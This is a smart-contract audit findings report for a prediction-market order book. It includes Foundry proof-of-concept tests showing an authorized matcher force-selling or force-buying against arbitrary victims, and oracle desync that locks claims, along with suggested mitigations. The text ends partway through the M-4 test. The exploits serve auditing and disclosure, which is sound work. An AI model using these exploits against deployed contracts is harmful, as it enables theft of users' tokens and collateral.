# 2025 10 index fun order book contest chainshieldai/orderbook solidity - Findings Report
## Commit hash: 4ac71bd44d28e930909921cdaf1e8e47d71de430

##Findings by Pattern


 **Derived From** : Authorized matcher can force-sell any holder’s tokens via executeSingleOrder (no consent)

[M-1]. executeSingleOrder/_executeAgainstMatcher lets authorized matcher burn arbitrary holder’s tokens and force a sale at attacker-chosen price
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: RequiresRole



 **Derived From** : numberOfOutcomes used at resolution equals the market’s configured outcome count for (questionId, epoch); otherwise conditionId mismatches minted tokenIds

[M-2]. resolveMarketEpoch accepts arbitrary numberOfOutcomes, writes root under wrong conditionId and DoS’s claims for the epoch
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: RequiresRole



 **Derived From** : Oracle address desync breaks conditionId; claims impossible and funds stuck

[M-3]. Oracle desync between MarketController and MarketResolver causes divergent conditionId, DoS on claims and locked collateral
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: RequireAdminRole



 **Derived From** : executeSingleOrder lets authorized matcher seize arbitrary users' tokens/funds via unvalidated counterparty

[M-4]. Unauthorized counterparty in MarketController.executeSingleOrder enables forced trades against arbitrary victims
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : Oracle change breaks condition ID determinism causing unclaimable payouts

[M-5]. Oracle update mutates conditionId; verifyProof reverts for pre-mint tokens, DoS on claims and stuck collateral in MarketResolver.verifyProof
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: RequireAdminRole



 **Derived From** : Mutable oracle in conditionId causes resolution/token desync after oracle rotation

[M-7]. Oracle rotation desynchronizes conditionId, breaking claims and enabling contradictory roots in MarketResolver._resolveMarketEpochInternal
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: RequireAdminRole



 **Derived From** : (order.outcome > 0) && ((order.outcome & (order.outcome - 1)) == 0) && (order.outcome < (1 << market.getOutcomeCount(order.questionId)))

[M-9]. Invalid outcome bitmask lets any user brick JIT matches via out-of-bounds write in MarketController._executeJITMinting
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : JIT minting loops over outcome count (gas DoS on high-outcome markets)

[M-10]. Unbounded loop in MarketController._executeJITMinting enables gas-based DoS for high-outcome markets
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresRole



 **Derived From** : For any (questionId, epoch, numberOfOutcomes), the conditionId used for resolution must equal keccak256(abi.encodePacked(oldOracle, questionId, numberOfOutcomes, epoch)) if tokens were minted under oldOracle

[M-13]. Oracle rotation in MarketResolver.updateOracle changes conditionId and bricks claims for positions minted under old oracle
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequireAdminRole





 **Derived From** : Changing collateral token can mix decimals and break balance units

[M-15]. Decimals-mismatched collateral swap in Vault.updateCollateralToken freezes withdrawals and corrupts balances
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: RequireAdminRole




 **Derived From** : oracle == marketResolver.oracle() at all times

[M-17]. Claims DoS: Divergent oracle between MarketController and MarketResolver bricks all redemptions and strands locked collateral
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: RequireAdminRole






 **Derived From** : Authorized matchers can set treasury and redirect all protocol fees

[M-19]. Authorized matcher can hijack treasury in MarketController.setTreasury and siphon all fees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: RequiresRole




### Number of Findings
- C: 0
- H: 0
- M: 12
- L: 8
- I: 0

##Findings by Pattern


 **Derived From** : Authorized matcher can force-sell any holder’s tokens via executeSingleOrder (no consent)

## [M-1]. executeSingleOrder/_executeAgainstMatcher lets authorized matcher burn arbitrary holder’s tokens and force a sale at attacker-chosen price

## Derived From Pattern/Invariant
Authorized matcher can force-sell any holder’s tokens via executeSingleOrder (no consent)

## Exploit Type
AccessControl

## Location
MarketController.executeSingleOrder/_executeAgainstMatcher

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
## Minimim Privilege Required
RequiresRole

## Description
executeSingleOrder takes an arbitrary counterparty address and forwards it to _executeAgainstMatcher without verifying that this counterparty equals msg.sender, is authorized, or has consented. In the buy branch, _executeAgainstMatcher checks the passed-in matcher’s balance, then burns matcher’s tokens and mints to the buyer, paying netPayment computed from the buyer’s order.price. There is no signature or auth from the matcher/counterparty. An authorized matcher can therefore pick any victim address holding inventory and force-sell their tokens at a near-zero price. Vulnerable snippets:

function executeSingleOrder(..., address counterparty) external onlyAuthorizedMatcher { ... _executeAgainstMatcher(order, fillAmount, counterparty); }

function _executeAgainstMatcher(order, fillAmount, address matcher) internal {
  ... require(positionTokens.balanceOf(matcher, tokenId) >= fillAmount, "Matcher insufficient inventory");
  positionTokens.burn(matcher, tokenId, fillAmount);
  positionTokens.mintBatch(order.user, tokenIds, amounts);
  ... uint256 paymentAmount = (fillAmount * order.price) / 10000;
  vault.transferBetweenUsers(conditionId, order.user, matcher, netPayment);
}

No requirement matcher == msg.sender, no signature from matcher, no role check on matcher, buyer controls price in order.

## Impact
An authorized matcher can pass any holder as the counterparty in executeSingleOrder and trigger _executeAgainstMatcher to burn that holder’s ERC1155 inventory and transfer it to the buyer without the holder’s consent or signature. The buyer’s order.price is used as execution price, so the attacker can pick a near-zero price and pay effectively nothing due to integer truncation (paymentAmount = fillAmount * price / 10000 can be 0). This enables forced liquidation of arbitrary user inventory and asset seizure under a privileged role.

## Proof of Concept
Scenario:
- Attacker is whitelisted as authorized matcher.
- Victim holds YES tokens (from a prior JIT mint fill).
- Attacker signs a BUY order for the same outcome at price=1 bp (0.01%) and selects fillAmount equal to victim’s balance.
- Attacker calls executeSingleOrder(order, sig, fillAmount, counterparty=victim).
- In _executeAgainstMatcher buy-branch, the contract only checks victim’s token balance and burns victim’s tokens, minting to attacker. Payment is computed from attacker’s buyer price (near-zero), so victim receives 0 due to integer truncation. No consent or signature is required from victim.
- Result: Victim’s tokens are confiscated; attacker receives them for free.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketController} from "src/Market/MarketController.sol";
import {IMarketController} from "src/Market/IMarketController.sol";
import {IPositionTokens} from "src/Token/IPositionTokens.sol";
import {PositionTokens} from "src/Token/PositionTokens.sol";
import {IVault} from "src/Vault/IVault.sol";
import {Vault} from "src/Vault/Vault.sol";
import {IMarket} from "src/Market/IMarket.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract MarketMock is IMarket {
    mapping(bytes32 => uint256) internal _outcomes;
    mapping(bytes32 => uint256) internal _epochDuration;
    mapping(bytes32 => bool) internal _exists;
    address public override marketController;

    function createMarket(bytes32 q, uint256 outcomeCount, uint256 resolutionTime, uint256 epochDuration) external override {
        _outcomes[q] = outcomeCount;
        _epochDuration[q] = epochDuration;
        _exists[q] = true;
        emit MarketCreated(q, outcomeCount, 0, resolutionTime);
    }
    function updateResolutionTime(bytes32, uint256) external override {}
    function advanceEpoch(bytes32) external override {}
    function isMarketOpen(bytes32) external pure override returns (bool) { return true; }
    function isMarketReadyForResolution(bytes32) external pure override returns (bool) { return false; }
    function getResolutionTime(bytes32) external pure override returns (uint256) { return 0; }
    function getCreationTime(bytes32) external view override returns (uint256) { return block.timestamp; }
    function getConditionId(address oracle, bytes32 questionId, uint256 numberOfOutcomes, uint256 epoch) external pure override returns (bytes32) {
        return keccak256(abi.encodePacked(oracle, questionId, numberOfOutcomes, epoch));
    }
    function getOutcomeCount(bytes32 q) external view override returns (uint256) { return _outcomes[q]; }
    function getCurrentEpoch(bytes32) external pure override returns (uint256) { return 0; }
    function getEpochDuration(bytes32 q) external view override returns (uint256) { return _epochDuration[q]; }
    function getEpochStartTime(bytes32, uint256) external pure override returns (uint256) { return 0; }
    function getEpochEndTime(bytes32, uint256) external pure override returns (uint256) { return 0; }
    function getMarketExists(bytes32 q) external view override returns (bool) { return _exists[q]; }
    function setMarketController(address mc) external override { marketController = mc; }
}

contract ForceSaleSingleOrderTest is Test {
    ERC20Mock usdc;
    PositionTokens pos;
    MarketResolver resolver;
    Vault vault;
    MarketMock market;
    MarketController mc;

    uint256 ownerPk = 0xA11CE;
    uint256 attackerPk = 0xB0B;
    uint256 victimPk = 0xC0DE;
    uint256 lpPk = 0xD00D;

    address owner = vm.addr(ownerPk);
    address attacker = vm.addr(attackerPk);
    address victim = vm.addr(victimPk);
    address lp = vm.addr(lpPk);

    bytes32 questionId = keccak256("Q1");
    address oracle = address(0x1234);

    function setUp() public {
        usdc = new ERC20Mock();
        pos = new PositionTokens();
        pos.initialize(owner);
        resolver = new MarketResolver();
        resolver.initialize(owner, oracle);

        vault = new Vault();
        vault.initialize(owner, address(usdc), address(this));

        market = new MarketMock();

        mc = new MarketController();
        mc.initialize(owner, address(pos), address(resolver), address(vault), address(market), oracle);

        vm.prank(owner); pos.setMarketController(address(mc));
        vm.prank(owner); vault.setMarketController(address(mc));
        vm.prank(owner); market.setMarketController(address(mc));

        vm.prank(owner); mc.setAuthorizedMatcher(attacker, true);

        vm.prank(attacker);
        mc.createMarket(questionId, 2, 0, 0);

        // Fund and deposit
        usdc.mint(victim, 1_000e18);
        usdc.mint(lp, 1_000e18);
        usdc.mint(attacker, 1_000e18);

        vm.startPrank(victim); usdc.approve(address(vault), type(uint256).max); vault.depositCollateral(500e18); vm.stopPrank();
        vm.startPrank(lp);     usdc.approve(address(vault), type(uint256).max); vault.depositCollateral(500e18); vm.stopPrank();
        vm.startPrank(attacker); usdc.approve(address(vault), type(uint256).max); vault.depositCollateral(500e18); vm.stopPrank();

        // Give victim YES inventory via JIT minting (victim buys, LP sells)
        IMarketController.Order memory victimBuy = IMarketController.Order({
            user: victim,
            questionId: questionId,
            outcome: 1,
            amount: 100,
            price: 6000,
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: true
        });
        IMarketController.Order memory lpSell = IMarketController.Order({
            user: lp,
            questionId: questionId,
            outcome: 1,
            amount: 100,
            price: 6000,
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: false
        });

        bytes memory sigVictimBuy = _signOrder(victimBuy, victimPk);
        bytes memory sigLpSell = _signOrder(lpSell, lpPk);

        vm.prank(attacker);
        mc.executeOrderMatch(victimBuy, lpSell, sigVictimBuy, sigLpSell, 100);

        // Victim now holds 100 YES tokens
        (bytes32 conditionId, uint256 yesId) = _conditionAndTokenId(questionId, 1);
        assertEq(pos.balanceOf(victim, yesId), 100, "victim should have 100 YES");
    }

    function test_force_sell_victim_inventory_at_zero_pay() public {
        // Pre-state balances
        (bytes32 conditionId, uint256 yesId) = _conditionAndTokenId(questionId, 1);
        uint256 victimBalBefore = vault.getAvailableBalance(victim);
        uint256 attackerBalBefore = vault.getAvailableBalance(attacker);

        // Attacker crafts BUY at 1 bp so payment = 100*1/10000 = 0
        IMarketController.Order memory attackerBuy = IMarketController.Order({
            user: attacker,
            questionId: questionId,
            outcome: 1,
            amount: 100,
            price: 1,
            nonce: 77,
            expiration: block.timestamp + 1 days,
            isBuyOrder: true
        });
        bytes memory sigAttacker = _signOrder(attackerBuy, attackerPk);

        vm.prank(attacker);
        mc.executeSingleOrder(attackerBuy, sigAttacker, 100, victim);

        // Tokens confiscated from victim and given to attacker
        assertEq(pos.balanceOf(victim, yesId), 0, "victim tokens burned");
        assertEq(pos.balanceOf(attacker, yesId), 100, "attacker received tokens");

        // No payment due to integer truncation (price so low that payment=0)
        uint256 victimBalAfter = vault.getAvailableBalance(victim);
        uint256 attackerBalAfter = vault.getAvailableBalance(attacker);
        assertEq(victimBalAfter, victimBalBefore, "victim received zero compensation");
        assertEq(attackerBalAfter, attackerBalBefore, "attacker paid zero");
    }

    function _conditionAndTokenId(bytes32 qId, uint256 outcome) internal view returns (bytes32 conditionId, uint256 tokenId) {
        uint256 n = market.getOutcomeCount(qId);
        conditionId = market.getConditionId(oracle, qId, n, 0);
        tokenId = pos.getTokenId(conditionId, outcome);
    }

    function _signOrder(IMarketController.Order memory order, uint256 pk) internal view returns (bytes memory) {
        bytes32 digest = mc.getOrderHash(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }
}


## Suggested Mitigation
Harden executeSingleOrder/_executeAgainstMatcher so the counterparty cannot be an arbitrary third-party:
- Enforce that the counterparty is the caller: require(counterparty == msg.sender && authorizedMatchers[msg.sender], "Counterparty must be calling authorized matcher"). This limits burns to the caller’s own inventory only.
- If you need to allow using a third-party inventory provider, require a valid EIP-712 signature from that provider (a sell/inventory order) with explicit constraints (price, amount, expiry). In that case, compute execution price from the counterparty’s signed order, not from the taker’s order.
- Optionally, guard against zero-payment swaps by requiring paymentAmount > 0 when executing the buy-branch against inventory, or enforce minimum price × amount >= 1.
These changes ensure no tokens are ever burned from an address without explicit consent (caller or signature) and prevent forced sales at attacker-chosen prices.





 **Derived From** : numberOfOutcomes used at resolution equals the market’s configured outcome count for (questionId, epoch); otherwise conditionId mismatches minted tokenIds

## [M-2]. resolveMarketEpoch accepts arbitrary numberOfOutcomes, writes root under wrong conditionId and DoS’s claims for the epoch

## Derived From Pattern/Invariant
numberOfOutcomes used at resolution equals the market’s configured outcome count for (questionId, epoch); otherwise conditionId mismatches minted tokenIds

## Exploit Type
StorageLayout

## Location
MarketResolver.resolveMarketEpoch

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
## Minimim Privilege Required
RequiresRole

## Description
MarketResolver._resolveMarketEpochInternal() derives conditionId using the unvalidated numberOfOutcomes parameter. If the resolver submits a different count than the market’s configured outcome count for (questionId, epoch), the merkle root is stored under a different conditionId than the one used to mint/burn tokens and lock collateral. Winners later verify/claim against the intended conditionId and revert with "Condition not resolved", functionally locking funds until a second (manual) correction call is made. Vulnerable snippet:

function _resolveMarketEpochInternal(bytes32 questionId, uint256 epoch, uint256 numberOfOutcomes, bytes32 merkleRoot) internal {
    ...
    bytes32 conditionId = getConditionId(oracle, questionId, numberOfOutcomes, epoch); // numberOfOutcomes not validated
    require(!isResolved[conditionId], "Already resolved");
    resolutionMerkleRoots[conditionId] = merkleRoot;
    isResolved[conditionId] = true;
    emit ConditionResolved(conditionId, questionId, epoch, merkleRoot);
}

There is no cross-check to the actual market metadata (outcomeCount), causing referential mismatch between minted tokenIds/locked collateral conditionId and the resolver’s stored root.

## Impact
Functional DoS of claims for the affected (questionId, epoch): winners cannot verify proofs or redeem, leaving user funds locked until the resolver submits a corrected resolution (if ever).

## Proof of Concept
- Pre-state: A market is traded with outcomeCount=2; positions/tokenIds and vault locks are keyed by intendedCid = keccak256(abi.encodePacked(oracle, q, 2, e)).
- Oracle/emergencyResolver accidentally calls resolveMarketEpoch(q, e, 3, root).
- Resolver writes under wrongCid = keccak256(abi.encodePacked(oracle, q, 3, e)).
- Users attempting to verify/claim with intendedCid fail: verifyProof(intendedCid, ...) reverts "Condition not resolved"; claim path reverts similarly, locking funds.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";

contract MarketResolver_MismatchOutcomeCountTest is Test {
    MarketResolver resolver;
    address owner = address(0xA11CE);
    address oracle = address(0xB0B);

    function setUp() public {
        resolver = new MarketResolver();
        resolver.initialize(owner, oracle);
    }

    function test_ResolveWithWrongOutcomeCount_DoesNotResolveIntendedCondition() public {
        bytes32 q = keccak256("Q");
        uint256 e = 1;
        uint256 intendedOutcomes = 2;
        uint256 wrongOutcomes = 3;

        // Intended conditionId used by the rest of the system
        bytes32 intendedCid = resolver.getConditionId(oracle, q, intendedOutcomes, e);
        assertEq(resolver.getResolutionRoot(intendedCid), bytes32(0));
        assertFalse(resolver.getResolutionStatus(intendedCid));

        // Simple single-leaf merkle root
        bytes32 leaf = keccak256(abi.encodePacked(uint256(1)));
        bytes32 merkleRoot = leaf;

        // Authorized resolver resolves with WRONG numberOfOutcomes
        vm.prank(oracle);
        resolver.resolveMarketEpoch(q, e, wrongOutcomes, merkleRoot);

        // Root stored under WRONG conditionId
        bytes32 wrongCid = resolver.getConditionId(oracle, q, wrongOutcomes, e);
        assertEq(resolver.getResolutionRoot(wrongCid), merkleRoot);
        assertTrue(resolver.getResolutionStatus(wrongCid));
        assertEq(resolver.getResolutionRoot(intendedCid), bytes32(0));
        assertFalse(resolver.getResolutionStatus(intendedCid));

        // Verifying against intendedCid (expected by tokens/claims) reverts -> DoS
        bytes32[] memory proof = new bytes32[](0);
        vm.expectRevert(bytes("Condition not resolved"));
        resolver.verifyProof(intendedCid, 1, proof);

        // Verifying against wrongCid succeeds (shows root is set under wrong key)
        bool ok = resolver.verifyProof(wrongCid, 1, proof);
        assertTrue(ok);
    }
}


## Suggested Mitigation
- Do not trust a caller-supplied numberOfOutcomes. Fetch it from the canonical Market metadata and compute conditionId with that value:
  1) Store an immutable/reference to Market in MarketResolver.
  2) In _resolveMarketEpochInternal, read uint256 oc = Market.getOutcomeCount(questionId) and require(numberOfOutcomes == oc), or simply drop the parameter and always use oc to derive conditionId.
  3) Alternatively, change API to accept a precomputed conditionId and validate it equals getConditionId(oracle, questionId, oc, epoch) before writing.
  4) Consider emitting numberOfOutcomes in the event to aid off-chain monitoring.





 **Derived From** : Oracle address desync breaks conditionId; claims impossible and funds stuck

## [M-3]. Oracle desync between MarketController and MarketResolver causes divergent conditionId, DoS on claims and locked collateral

## Derived From Pattern/Invariant
Oracle address desync breaks conditionId; claims impossible and funds stuck

## Exploit Type
AccessControl

## Location
MarketController.claimWinnings

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required
RequireAdminRole

## Description
MarketController and MarketResolver each store their own oracle address and derive conditionId with their respective value. If governance updates only one oracle (MarketController.updateOracle or MarketResolver.updateOracle), conditionIds diverge. Tokens minted before the change encode the old oracle in their tokenId (via conditionId), while claimWinnings recomputes conditionId from the current MarketController.oracle. If MarketResolver resolved using its own (different) oracle, claimWinnings reverts at require(marketResolver.getResolutionStatus(conditionId)) ('Market not resolved') or later at 'No tokens to claim', permanently bricking claims and leaving collateral locked in Vault. Vulnerable snippets: MarketController.claimWinnings: bytes32 conditionId = market.getConditionId(oracle, questionId, numberOfOutcomes, epoch); MarketResolver._resolveMarketEpochInternal: bytes32 conditionId = getConditionId(oracle, questionId, numberOfOutcomes, epoch); Separate oracle variables allow out-of-sync state.

## Impact
If MarketController.oracle and MarketResolver.oracle become out of sync, conditionIds diverge. Position tokens minted while using the controller’s oracle can never be claimed if the resolver records resolution under a different oracle-derived conditionId. This results in a persistent DoS on claims and indefinite collateral lock for those epochs until governance intervenes, potentially requiring awkward double-resolutions. No assets are stolen, but protocol liveness and user withdrawals are impaired for the affected markets.

## Proof of Concept
1) Initialize system with oracle O1 set in both MarketController and MarketResolver. 2) Create a market and execute a JIT trade to mint tokens for current epoch (locks collateral under conditionId(oracle=O1,...)). 3) Governance updates only MarketResolver.oracle to O2. 4) Oracle O2 resolves the epoch (resolver stores merkle root at conditionId(oracle=O2,...)). 5) Winner calls MarketController.claimWinnings; it computes conditionId with controller.oracle=O1 and reverts 'Market not resolved' because resolution was recorded against O2. Collateral under the O1 conditionId remains locked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketController} from "src/Market/MarketController.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {MarketContract} from "src/Market/Market.sol";
import {PositionTokens} from "src/Token/PositionTokens.sol";
import {Vault} from "src/Vault/Vault.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {IMarketController} from "src/Market/IMarketController.sol";

contract OracleDesyncTest is Test {
    MarketController controller;
    MarketResolver resolver;
    MarketContract market;
    PositionTokens tokens;
    Vault vault;
    ERC20Mock usdc;

    address owner = address(this);
    address oracle1 = address(0x1001);
    address oracle2 = address(0x2002);
    bytes32 qid = keccak256("Q1");

    uint256 pkBuyer = 0xA11CE;
    address buyer = vm.addr(pkBuyer);
    uint256 pkSeller = 0xB0B;
    address seller = vm.addr(pkSeller);

    function setUp() public {
        usdc = new ERC20Mock();
        tokens = new PositionTokens();
        tokens.initialize(owner);
        resolver = new MarketResolver();
        resolver.initialize(owner, oracle1);
        vault = new Vault();
        // Temporary controller, will set real one after deployment
        vault.initialize(owner, address(usdc), address(this));
        market = new MarketContract();
        market.initialize(owner);
        controller = new MarketController();
        controller.initialize(owner, address(tokens), address(resolver), address(vault), address(market), oracle1);

        // Link contracts
        tokens.setMarketController(address(controller));
        vault.setMarketController(address(controller));
        market.setMarketController(address(controller));
        resolver.setEmergencyResolver(address(controller));

        // Authorize matcher
        controller.setAuthorizedMatcher(address(this), true);

        // Fund users and deposit into vault
        usdc.mint(buyer, 1000e18);
        usdc.mint(seller, 1000e18);
        vm.prank(buyer); usdc.approve(address(vault), type(uint256).max);
        vm.prank(seller); usdc.approve(address(vault), type(uint256).max);
        vm.prank(buyer); vault.depositCollateral(800e18);
        vm.prank(seller); vault.depositCollateral(800e18);

        // Create a time-based market (epochs auto-advance)
        controller.createMarket(qid, 2, 0, 1 days);
    }

    function test_OracleDesync_BricksClaims_And_LocksCollateral() public {
        // Prepare EIP-712 orders
        IMarketController.Order memory buyOrder = IMarketController.Order({
            user: buyer,
            questionId: qid,
            outcome: 1,
            amount: 1e18,
            price: 6000,
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: true
        });
        bytes32 buyHash = controller.getOrderHash(buyOrder);
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(pkBuyer, buyHash);
        bytes memory buySig = abi.encodePacked(r1, s1, v1);

        IMarketController.Order memory sellOrder = IMarketController.Order({
            user: seller,
            questionId: qid,
            outcome: 1,
            amount: 1e18,
            price: 6000,
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: false
        });
        bytes32 sellHash = controller.getOrderHash(sellOrder);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(pkSeller, sellHash);
        bytes memory sellSig = abi.encodePacked(r2, s2, v2);

        // Execute match (JIT mint path, as seller has no tokens)
        controller.executeOrderMatch(buyOrder, sellOrder, buySig, sellSig, 1e18);

        uint256 epoch = market.getCurrentEpoch(qid);
        uint256 outcomeCount = market.getOutcomeCount(qid);
        bytes32 conditionOld = market.getConditionId(oracle1, qid, outcomeCount, epoch);

        // Update only resolver's oracle to oracle2 (controller still has oracle1)
        resolver.updateOracle(oracle2);

        // Resolve using resolver's current oracle (oracle2)
        bytes32 root = keccak256(abi.encodePacked(uint256(1))); // outcome 1
        vm.prank(oracle2);
        resolver.resolveMarketEpoch(qid, epoch, outcomeCount, root);

        // Claim should revert because controller computes conditionId with oracle1
        bytes32[] memory proof = new bytes32[](0);
        vm.prank(buyer);
        vm.expectRevert(bytes("Market not resolved"));
        controller.claimWinnings(qid, epoch, 1, proof);

        // Collateral remains locked under the old conditionId
        uint256 locked = vault.getTotalLocked(conditionOld);
        assertEq(locked, 1e18, "collateral remains locked due to oracle desync");
    }
}


## Suggested Mitigation
Remove the oracle field from MarketController and derive the oracle address from MarketResolver in all places where conditionId is computed (e.g., claimWinnings, _executeTrade, _executeAgainstMatcher). Also remove MarketController.updateOracle to avoid split authority. Alternatively, centralize oracle storage in MarketResolver (single setter) and make MarketController read-only for oracle, or add a single governance function that atomically updates both with checks ensuring they stay identical. Consider adding a sanity check that reverts if MarketController.oracle (if kept for backward compatibility) differs from MarketResolver.oracle to prevent desync from being introduced.





 **Derived From** : executeSingleOrder lets authorized matcher seize arbitrary users' tokens/funds via unvalidated counterparty

## [M-4]. Unauthorized counterparty in MarketController.executeSingleOrder enables forced trades against arbitrary victims

## Derived From Pattern/Invariant
executeSingleOrder lets authorized matcher seize arbitrary users' tokens/funds via unvalidated counterparty

## Exploit Type
AccessControl

## Location
MarketController.executeSingleOrder

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required
RequiresRole

## Description
MarketController.executeSingleOrder takes a counterparty address from the caller and forwards it to _executeAgainstMatcher as 'matcher' without verifying that the counterparty equals msg.sender or is an authorized matcher. _executeAgainstMatcher then uses that address for ERC1155 burns and Vault transfers. Because PositionTokens.burn is callable by MarketController for any address and Vault.transferBetweenUsers moves balances without user consent, an authorized matcher can: (a) force-sell a victim's tokens by passing the victim as counterparty when order.isBuyOrder=true, burning the victim's tokens and paying them at the attacker's chosen price, or (b) force-buy using a victim's vault balance by passing the victim as counterparty when order.isBuyOrder=false, transferring USDC from the victim to the attacker while minting tokens to the victim. There is no check like `require(counterparty == msg.sender)` or `require(authorizedMatchers[counterparty])`.

Vulnerable snippets:
- executeSingleOrder(..., address counterparty) { ... _executeAgainstMatcher(order, fillAmount, counterparty); }
- _executeAgainstMatcher(..., address matcher) { positionTokens.burn(matcher, tokenId, fillAmount); ... vault.transferBetweenUsers(conditionId, order.user, matcher, netPayment); // buy case ... vault.transferBetweenUsers(conditionId, matcher, order.user, netPayment); // sell case }

## Impact
Any authorized matcher can unilaterally force trades against arbitrary users by supplying them as the counterparty in executeSingleOrder, enabling: (a) forced-buy that drains a victim’s Vault balance (transfers funds from victim to attacker while minting tokens to the victim), and (b) forced-sell that burns a victim’s tokens and transfers them to the attacker at an attacker-chosen price (attacker must pay). This results in direct monetary loss or involuntary token disposition for victims. The attack requires the caller to be an authorized matcher.

## Proof of Concept
Step-by-step (force-buy, drains victim USDC):
1) Attacker is an authorized matcher. Victim has USDC deposited in Vault. Attacker also pre-mints outcome tokens to themselves via a JIT match (executeOrderMatch).
2) Attacker crafts a signed sell order (order.isBuyOrder=false) with very high price (e.g., 100%). This order is signed by the attacker (order.user).
3) Attacker calls executeSingleOrder(order, signature, fillAmount, counterparty=victim).
4) _executeAgainstMatcher burns the attacker's tokens, mints same tokens to the victim, and transfers netPayment from victim to attacker (no victim consent check). The victim's USDC decreases, attacker's USDC increases.

Alternative (force-sell victim tokens):
1) Victim holds ERC1155 tokens. Attacker crafts a signed buy order (order.isBuyOrder=true) at a low price and calls executeSingleOrder with counterparty=victim.
2) _executeAgainstMatcher burns victim's tokens and pays them the low price from the buyer's Vault balance, forcibly selling the victim's position.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketController} from "src/Market/MarketController.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {PositionTokens} from "src/Token/PositionTokens.sol";
import {Vault} from "src/Vault/Vault.sol";
import {IMarketController} from "src/Market/IMarketController.sol";
import {MarketContract} from "src/Market/Market.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract ExecuteSingleOrder_AuthBypass_Test is Test {
    MarketController controller;
    MarketContract market;
    MarketResolver resolver;
    PositionTokens positions;
    Vault vault;
    ERC20Mock usdc;

    address owner;
    address oracle;
    address attacker; uint256 attackerPK;
    address maker2;  uint256 maker2PK;
    address victim;

    bytes32 questionId;
    uint256 outcome = 1; // e.g., YES

    function setUp() public {
        owner = vm.addr(1);
        attackerPK = 2; attacker = vm.addr(attackerPK);
        maker2PK = 3; maker2 = vm.addr(maker2PK);
        oracle = vm.addr(4);
        victim = vm.addr(5);

        // Deploy components
        positions = new PositionTokens();
        positions.initialize(owner);

        resolver = new MarketResolver();
        resolver.initialize(owner, oracle);

        market = new MarketContract();
        market.initialize(owner);

        usdc = new ERC20Mock();
        vault = new Vault();
        // temp controller set; will update to real controller after deployment
        vault.initialize(owner, address(usdc), address(0xBEEF));

        controller = new MarketController();
        controller.initialize(owner, address(positions), address(resolver), address(vault), address(market), oracle);

        // Link contracts
        vm.startPrank(owner);
        positions.setMarketController(address(controller));
        vault.setMarketController(address(controller));
        market.setMarketController(address(controller));
        resolver.setEmergencyResolver(address(controller));
        controller.setAuthorizedMatcher(attacker, true);
        vm.stopPrank();

        // Create open market (manual, 2 outcomes)
        questionId = keccak256("QID-FORCE-BUY");
        vm.prank(attacker);
        controller.createMarket(questionId, 2, 0, 0);

        // Fund accounts and deposit to Vault
        usdc.mint(attacker, 1_000_000);
        usdc.mint(maker2,  1_000_000);
        usdc.mint(victim,  1_000_000);

        vm.startPrank(attacker);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(1000);
        vm.stopPrank();

        vm.startPrank(maker2);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(1000);
        vm.stopPrank();

        vm.startPrank(victim);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(1000);
        vm.stopPrank();
    }

    function _sign(IMarketController.Order memory order, uint256 pk) internal view returns (bytes memory sig) {
        bytes32 digest = controller.getOrderHash(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function test_forceBuy_drainsVictimUSDC() public {
        // 1) Attacker mints YES inventory via JIT (executeOrderMatch)
        IMarketController.Order memory buy = IMarketController.Order({
            user: attacker,
            questionId: questionId,
            outcome: outcome,
            amount: 500,
            price: 5000, // 50%
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: true
        });
        IMarketController.Order memory sell = IMarketController.Order({
            user: maker2,
            questionId: questionId,
            outcome: outcome,
            amount: 500,
            price: 5000, // 50%
            nonce: 2,
            expiration: block.timestamp + 1 days,
            isBuyOrder: false
        });

        bytes memory buySig  = _sign(buy, attackerPK);
        bytes memory sellSig = _sign(sell,  maker2PK);

        vm.prank(attacker);
